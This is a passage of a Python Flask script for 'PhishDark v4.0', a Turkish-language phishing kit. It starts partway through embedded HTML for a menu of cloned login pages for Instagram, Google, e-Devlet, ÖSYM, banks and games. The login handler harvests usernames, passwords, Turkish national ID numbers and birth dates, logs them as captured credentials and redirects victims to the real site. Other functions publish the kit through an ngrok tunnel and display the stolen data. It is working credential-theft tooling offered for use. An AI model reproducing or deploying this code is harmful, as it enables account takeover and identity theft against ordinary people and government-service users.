            background: linear-gradient(135deg, #E50914, #B00710);
        }
        
        .option-card[href="/twitter"] {
            background: linear-gradient(135deg, #1DA1F2, #0D8ECF);
        }
        
        .option-card[href="/hmb"] {
            background: linear-gradient(135deg, #795548, #5D4037);
        }
        
        .option-card[href="/edevlet"] {
            background: linear-gradient(135deg, #2196F3, #0B7DDA);
        }
        
        .option-card[href="/ptt"] {
            background: linear-gradient(135deg, #FF9800, #F57C00);
        }
        
        .option-card[href="/valorant"] {
            background: linear-gradient(135deg, #FF4655, #D13A48);
        }
        
        .option-card[href="/google"] {
            background: linear-gradient(135deg, #4285F4, #3367D6);
        }
        
        .option-card[href="/instagram-takipci"] {
            background: linear-gradient(135deg, #833AB4, #C13584);
        }
        
        .option-card[href="/telegram"] {
            background: linear-gradient(135deg, #0088CC, #006699);
        }
        
        .option-card[href="/whatsapp"] {
            background: linear-gradient(135deg, #25D366, #128C7E);
        }
        
        .option-card[href="/steam"] {
            background: linear-gradient(135deg, #1b2838, #2a475e);
        }
        
        .option-card[href="/spotify"] {
            background: linear-gradient(135deg, #1DB954, #1AA34A);
        }
        
        @keyframes gradientBG {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }
        
        /* Responsive design */
        @media (max-width: 1024px) {
            .options-grid {
                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                gap: 20px;
            }
            
            .header h1 {
                font-size: 3rem;
            }
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 20px;
            }
            
            .options-grid {
                grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
                gap: 15px;
            }
            
            .header h1 {
                font-size: 2.5rem;
            }
            
            .header p {
                font-size: 1.1rem;
            }
            
            .option-card {
                padding: 25px 15px;
            }
            
            .option-icon {
                font-size: 2.5rem;
                margin-bottom: 15px;
            }
            
            .option-title {
                font-size: 1.2rem;
            }
        }
        
        @media (max-width: 480px) {
            .header h1 {
                font-size: 2rem;
            }
            
            .options-grid {
                grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
            }
            
            .option-card {
                padding: 20px 10px;
            }
            
            .option-icon {
                font-size: 2rem;
            }
            
            .option-title {
                font-size: 1rem;
            }
        }
        
        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(var(--primary-color), var(--secondary-color));
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(var(--secondary-color), var(--primary-color));
        }
        
        /* Tooltip for options */
        .option-card:hover .option-desc {
            display: block;
            animation: fadeIn 0.5s ease;
        }
    </style>
</head>
<body>
    <!-- Floating particles background -->
    <div class="particles-container" id="particles"></div>
    
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-shield-alt"></i> PhishDark v4.0</h1>
            <p>2025'in En Gelişmiş Profesyonel Kimlik Avı Platformu</p>
        </div>
        
        <div class="options-grid">
            <a href="/instagram" class="option-card">
                <div class="badge popular">POPÜLER</div>
                <i class="fab fa-instagram option-icon"></i>
                <h3 class="option-title">Instagram</h3>
                <p class="option-desc">Giriş sayfası klonu</p>
            </a>
            
            <a href="/facebook" class="option-card">
                <i class="fab fa-facebook option-icon"></i>
                <h3 class="option-title">Facebook</h3>
                <p class="option-desc">Giriş sayfası klonu</p>
            </a>
            
            <a href="/tiktok" class="option-card">
                <i class="fab fa-tiktok option-icon"></i>
                <h3 class="option-title">TikTok</h3>
                <p class="option-desc">Giriş sayfası klonu</p>
            </a>
            
            <a href="/e-ticaret" class="option-card">
                <i class="fas fa-shopping-cart option-icon"></i>
                <h3 class="option-title">E-Ticaret</h3>
                <p class="option-desc">Trendyol/Hepsiburada</p>
            </a>
            
            <a href="/ibb" class="option-card">
                <i class="fas fa-city option-icon"></i>
                <h3 class="option-title">İBB</h3>
                <p class="option-desc">İstanbul Belediyesi</p>
            </a>
            
            <a href="/osym" class="option-card">
                <i class="fas fa-graduation-cap option-icon"></i>
                <h3 class="option-title">ÖSYM</h3>
                <p class="option-desc">Sınav giriş klonu</p>
            </a>
            
            <a href="/netflix" class="option-card">
                <i class="fab fa-netflix option-icon"></i>
                <h3 class="option-title">Netflix</h3>
                <p class="option-desc">Abonelik girişi</p>
            </a>
            
            <a href="/twitter" class="option-card">
                <i class="fab fa-twitter option-icon"></i>
                <h3 class="option-title">Twitter</h3>
                <p class="option-desc">X platform girişi</p>
            </a>
            
            <a href="/hmb" class="option-card">
                <i class="fas fa-landmark option-icon"></i>
                <h3 class="option-title">HMB</h3>
                <p class="option-desc">E-Devlet girişi</p>
            </a>
            
            <a href="/edevlet" class="option-card">
                <div class="badge new">YENİ</div>
                <i class="fas fa-id-card option-icon"></i>
                <h3 class="option-title">e-Devlet</h3>
                <p class="option-desc">Resmi giriş klonu</p>
            </a>
            
            <a href="/ptt" class="option-card">
                <div class="badge new">YENİ</div>
                <i class="fas fa-truck option-icon"></i>
                <h3 class="option-title">PTT Kargo</h3>
                <p class="option-desc">Takip giriş sayfası</p>
            </a>
            
            <a href="/valorant" class="option-card">
                <div class="badge new">YENİ</div>
                <i class="fas fa-gamepad option-icon"></i>
                <h3 class="option-title">VALORANT</h3>
                <p class="option-desc">Riot Games girişi</p>
            </a>
            
            <a href="/google" class="option-card">
                <div class="badge pro">PRO</div>
                <i class="fab fa-google option-icon"></i>
                <h3 class="option-title">Google</h3>
                <p class="option-desc">Gmail giriş klonu</p>
            </a>
            
            <a href="/instagram-takipci" class="option-card">
                <div class="badge new">YENİ</div>
                <i class="fas fa-users option-icon"></i>
                <h3 class="option-title">Takipçi Hilesi</h3>
                <p class="option-desc">Ücretsiz takipçi</p>
            </a>
            
            <a href="/telegram" class="option-card">
                <div class="badge new">YENİ</div>
                <i class="fab fa-telegram option-icon"></i>
                <h3 class="option-title">Telegram</h3>
                <p class="option-desc">Mesajlaşma uygulaması</p>
            </a>
            
            <a href="/whatsapp" class="option-card">
                <div class="badge new">YENİ</div>
                <i class="fab fa-whatsapp option-icon"></i>
                <h3 class="option-title">WhatsApp</h3>
                <p class="option-desc">Web giriş klonu</p>
            </a>
            
            <a href="/steam" class="option-card">
                <div class="badge new">YENİ</div>
                <i class="fab fa-steam option-icon"></i>
                <h3 class="option-title">Steam</h3>
                <p class="option-desc">Oyun platformu</p>
            </a>
            
            <a href="/spotify" class="option-card">
                <div class="badge new">YENİ</div>
                <i class="fab fa-spotify option-icon"></i>
                <h3 class="option-title">Spotify</h3>
                <p class="option-desc">Premium girişi</p>
            </a>
        </div>
        
        <div class="footer">
            PhishDark Tool v4.0 | © 2025 | <a href="https://instagram.com/gokhan.yakut.04" target="_blank">Instagram: @gokhan.yakut.04</a>
        </div>
    </div>

    <script>
        // Enhanced floating particles
        function createParticles() {
            const container = document.getElementById('particles');
            const particleCount = Math.floor(window.innerWidth / 10);
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                // Random size between 1px and 5px
                const size = Math.random() * 4 + 1;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                
                // Random position
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                
                // Random animation duration between 15s and 30s
                const duration = Math.random() * 15 + 15;
                particle.style.animationDuration = `${duration}s`;
                
                // Random delay
                particle.style.animationDelay = `${Math.random() * 5}s`;
                
                // Random opacity
                particle.style.opacity = Math.random() * 0.5 + 0.1;
                
                container.appendChild(particle);
            }
        }
        
        // Initialize particles when DOM loads
        document.addEventListener('DOMContentLoaded', () => {
            createParticles();
            
            // Add hover effect delay for better UX
            const cards = document.querySelectorAll('.option-card');
            cards.forEach((card, index) => {
                card.style.transitionDelay = `${index * 0.05}s`;
            });
        });
        
        // Responsive adjustments
        window.addEventListener('resize', () => {
            const container = document.getElementById('particles');
            container.innerHTML = '';
            createParticles();
        });
    </script>
</body>
</html>
    """

@app.route('/<page>')
def serve_page(page):
    if page in TEMPLATES:
        session['current_page'] = page
        return render_template_string(TEMPLATES[page])
    return redirect('/select')

@app.route('/login', methods=['POST'])
def login():
    current_page = session.get('current_page', 'instagram')
    username = request.form.get('username') or request.form.get('email') or request.form.get('tcNo') or request.form.get('belgeNo') or request.form.get('tckn') or request.form.get('tc')
    password = request.form.get('password')
    
    # Get additional fields for specific pages
    additional_data = {}
    if current_page in ['ibb', 'edevlet', 'hmb', 'osym']:
        additional_data['birthDate'] = request.form.get('birthDate', '')
        additional_data['applicationType'] = request.form.get('applicationType', '')
    if current_page in ['osym', 'hmb', 'edevlet']:
        additional_data['belgeNo'] = request.form.get('belgeNo', '')
    if current_page in ['hmb', 'edevlet']:
        additional_data['captcha'] = request.form.get('captcha', '')
    
    # Save the credentials with timestamp
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(DATA_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n[+] {timestamp} - Yeni Kimlik Bilgisi Yakalandı!\n")
        f.write(f"Platform: {current_page}\n")
        f.write(f"Kullanıcı Adı/TCKN: {username}\n")
        f.write(f"Şifre: {password}\n")
        if additional_data:
            for key, value in additional_data.items():
                f.write(f"{key}: {value}\n")
        f.write("-"*50 + "\n")
    
    # Print colored output to console
    print(f"\n{Colors.OKGREEN}[+] {timestamp} - Yeni Kimlik Bilgisi Yakalandı!{Colors.ENDC}")
    print(f"{Colors.OKCYAN}Platform:{Colors.ENDC} {current_page}")
    print(f"{Colors.OKCYAN}Kullanıcı Adı/TCKN:{Colors.ENDC} {username}")
    print(f"{Colors.OKCYAN}Şifre:{Colors.ENDC} {password}")
    if additional_data:
        for key, value in additional_data.items():
            print(f"{Colors.OKCYAN}{key}:{Colors.ENDC} {value}")
    print("-"*50)
    
    # Redirect to the real service
    redirect_urls = {
        "instagram": "https://www.instagram.com/accounts/login/",
        "facebook": "https://www.facebook.com/login/",
        "tiktok": "https://www.tiktok.com/login/",
        "e-ticaret": "https://www.trendyol.com/giris",
        "ibb": "https://www.ibb.istanbul/",
        "osym": "https://ais.osym.gov.tr/",
        "netflix": "https://www.netflix.com/tr/login",
        "twitter": "https://twitter.com/login",
        "hmb": "https://giris.hmb.gov.tr/login",
        "edevlet": "https://giris.turkiye.gov.tr/",
        "ptt": "https://www.ptt.gov.tr/",
        "valorant": "https://auth.riotgames.com/",
        "google": "https://accounts.google.com/",
        "instagram-takipci": "https://www.instagram.com/"
    }
    return redirect(redirect_urls.get(current_page, "https://www.google.com"))

def setup_ngrok():
    print(f"\n{Colors.OKBLUE}[+] Ngrok kurulumu kontrol ediliyor...{Colors.ENDC}")
    try:
        if not os.path.exists(os.path.expanduser("~/.ngrok2/ngrok.yml")):
            if not NGROK_AUTH_TOKEN:
                print(f"{Colors.FAIL}[!] Lütfen ngrok auth token bulunamadı!{Colors.ENDC}")
                print(f"{Colors.FAIL}[!] Ngrok web sitesinden token alıp script içindeki NGROK_AUTH_TOKEN değişkenine ekleyin{Colors.ENDC}")
                return False
            
            print(f"{Colors.OKBLUE}[+] Ngrok yapılandırma dosyası oluşturuluyor...{Colors.ENDC}")
            os.makedirs(os.path.expanduser("~/.ngrok2"), exist_ok=True)
            with open(os.path.expanduser("~/.ngrok2/ngrok.yml"), "w") as f:
                f.write(f"authtoken: {NGROK_AUTH_TOKEN}\n")
        
        print(f"{Colors.OKGREEN}[+] Ngrok başarıyla yapılandırıldı{Colors.ENDC}")
        return True
    except Exception as e:
        print(f"{Colors.FAIL}[!] Ngrok kurulumunda hata: {e}{Colors.ENDC}")
        return False

def start_local(port=5000):
    print(f"\n{Colors.OKBLUE}[+] Yerel sunucu başlatılıyor (http://localhost:{port}){Colors.ENDC}")
    app.run(host='0.0.0.0', port=port)

def start_ngrok(port=5000):
    if not setup_ngrok():
        print(f"{Colors.FAIL}[!] Ngrok başlatılamadı!{Colors.ENDC}")
        return
    
    print(f"\n{Colors.OKBLUE}[+] Ngrok tüneli başlatılıyor...{Colors.ENDC}")
    try:
        # Ngrok ayarları
        conf.get_default().region = "eu"
        conf.get_default().monitor_thread = False
        
        # HTTP tüneli oluştur
        ngrok_tunnel = ngrok.connect(port, bind_tls=True)
        public_url = ngrok_tunnel.public_url
        
        print(f"\n{Colors.OKGREEN}[+] Ngrok URL: {Colors.UNDERLINE}{public_url}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Bu URL'yi kullanabilirsiniz (CTRL+C ile durdurun){Colors.ENDC}\n")
        
        # URL'i dosyaya kaydet
        with open("ngrok_url.txt", "w") as f:
            f.write(public_url)
            
    except Exception as e:
        print(f"{Colors.FAIL}[!] Ngrok başlatılırken hata oluştu: {e}{Colors.ENDC}")

def start_combined(port=5000):
    print(f"\n{Colors.OKBLUE}[+] Hem yerel hem de ngrok sunucuları başlatılıyor...{Colors.ENDC}")
    
    # Ngrok'u ayrı thread'de başlat
    ngrok_thread = threading.Thread(target=start_ngrok, args=(port,), daemon=True)
    ngrok_thread.start()
    
    # Flask sunucusunu başlat
    start_local(port)

def show_credentials():
    try:
        if not os.path.exists(DATA_FILE):
            print(f"\n{Colors.WARNING}[!] Henüz kimlik bilgisi yakalanmadı!{Colors.ENDC}")
            return
        
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            creds = f.read()
        
        if not creds.strip():
            print(f"\n{Colors.WARNING}[!] Henüz kimlik bilgisi yakalanmadı!{Colors.ENDC}")
            return
        
        print(f"\n{Colors.OKGREEN}[+] Yakalanan Kimlik Bilgileri:{Colors.ENDC}")
        print(f"{Colors.OKBLUE}{'='*80}{Colors.ENDC}")
        print(creds)
        print(f"{Colors.OKBLUE}{'='*80}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[!] Kimlik bilgileri okunurken hata: {e}{Colors.ENDC}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(f"""{Colors.HEADER}
    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██████╗  █████╗ ██████╗ ██╗  ██╗
    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝ 
    ██████╔╝███████║██║███████╗███████║██║  ██║███████║██████╔╝█████╔╝  
    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║  ██║██╔══██║██╔══██╗██╔═██╗  
    ██║     ██║  ██║██║███████║██║  ██║██████╔╝██║  ██║██║  ██║██║  ██╗
    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    {Colors.ENDC}""")
    print(f"{Colors.OKCYAN}\t\t\t   PhishDark Tool v4.0{Colors.ENDC}")
    print(f"{Colors.OKGREEN}\t\t   Instagram: @gokhan.yakut.04{Colors.ENDC}\n")

def menu():
    print_banner()
    print(f"{Colors.BOLD}[1] Yerel Sunucu Başlat (localhost){Colors.ENDC}")
    print(f"{Colors.BOLD}[2] Ngrok Tüneli Başlat{Colors.ENDC}")
    print(f"{Colors.BOLD}[3] Hem Yerel Hem Ngrok Başlat{Colors.ENDC}")
    print(f"{Colors.BOLD}[4] Yakalanan Kimlik Bilgilerini Göster{Colors.ENDC}")
    print(f"{Colors.BOLD}[5] Çıkış{Colors.ENDC}")
    
    choice = input(f"\n{Colors.OKBLUE}» Seçiminiz (1-5): {Colors.ENDC}")
    
    if choice == "1":
        port_input = input(f"{Colors.OKCYAN}↪ Port numarası (varsayılan 5000): {Colors.ENDC}") or "5000"
        port = int(port_input)
        start_local(port)
    elif choice == "2":
        port_input = input(f"{Colors.OKCYAN}↪ Port numarası (varsayılan 5000): {Colors.ENDC}") or "5000"
        port = int(port_input)
        start_ngrok(port)
    elif choice == "3":
        port_input = input(f"{Colors.OKCYAN}↪ Port numarası (varsayılan 5000): {Colors.ENDC}") or "5000"
        port = int(port_input)
        start_combined(port)
    elif choice == "4":
        show_credentials()
        input(f"\n{Colors.OKCYAN}↪ Devam etmek için Enter'a basın...{Colors.ENDC}")
        menu()
    elif choice == "5":
        print(f"\n{Colors.FAIL}✗ Çıkış yapılıyor...{Colors.ENDC}")
        sys.exit(0)
    else:
        print(f"\n{Colors.FAIL}⚠ Geçersiz seçim!{Colors.ENDC}")
        time.sleep(1)
        menu()

if __name__ == '__main__':
    # Eski verileri temizle
    if os.path.exists(DATA_FILE):
        os.remove(DATA_FILE)
    
    # Ana menüyü başlat
    menu()